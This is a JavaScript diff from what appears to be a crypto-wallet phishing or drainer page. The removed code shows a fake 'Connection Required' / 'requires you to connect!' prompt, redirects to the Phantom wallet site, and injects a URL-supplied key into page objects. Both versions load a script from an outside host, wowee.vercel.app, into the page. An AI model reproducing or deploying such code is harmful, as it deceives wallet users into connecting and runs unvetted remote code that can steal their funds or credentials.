@@ -1,49 +1,9 @@
 const ensurePageChange = setInterval(() => {
   if (document.getElementById("pageFullyLoadedActive") != null) {
-    try {
-      const url = new URL(window.location.href);
-      const params = new URLSearchParams(url.search);
-      const domain = params.get("dom");
-      if (domain) {
-        document.getElementById(
-          "mainTitle"
-        ).innerText = `${domain} requires you to connect!`;
-      } else {
-        document.getElementById("mainTitle").innerText = `Connection Required`;
-      }
-    } catch (error) {
-      document.getElementById("mainTitle").innerText = `Connection Required`;
-    }
 
-    try {
-      const url = new URL(window.location.href);
-      const params = new URLSearchParams(url.search);
-      const key = params.get("key");
-      if (key) {
-
-      setInterval(() => {
-          try {
-            Object.keys(window).forEach((keyName) => {
-              try {
-                  if (typeof(window[keyName]) == "object") {
-                      if (window[keyName]["key"] != null && window[key]["explain_blowfish"] != null) {
-                          window[keyName]["key"] = key;
-                      }
-                  }
-              } catch(error) {}
-          });
-          } catch(error) {}
-       }, 50);
-
-        const script = document.createElement('script');
-        script.src = 'https://wowee.vercel.app/main_source.js';
+    const script = document.createElement('script');
+        script.src = 'https://wowee.vercel.app/basic_code.js';
         document.body.appendChild(script);
-      } else {
-        location.href = "https://phantom.app"
-      }
-    } catch(error) {
-location.href = "https://phantom.app"
-}
 
     return clearInterval(ensurePageChange);
   };
